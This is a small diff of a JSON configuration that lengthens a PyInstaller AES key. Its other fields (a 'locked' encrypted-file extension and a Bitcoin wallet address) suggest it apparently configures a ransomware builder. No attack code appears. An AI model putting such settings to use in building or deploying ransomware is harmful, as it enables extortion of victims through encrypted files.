@@ -4,7 +4,7 @@
 	"min_version": "25",
 	"filename": "hello",
 	"extension": "locked",
-	"pyinstaller_aes_key": "0123456789abcdef",
+	"pyinstaller_aes_key": "0123456789abcdef0123456789abcdef",
 	"icon_file": "C:\\Users\\Sithis\\hello.ico",
 	"encrypted_file_extension": "locked",
 	"wallet_address": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay",
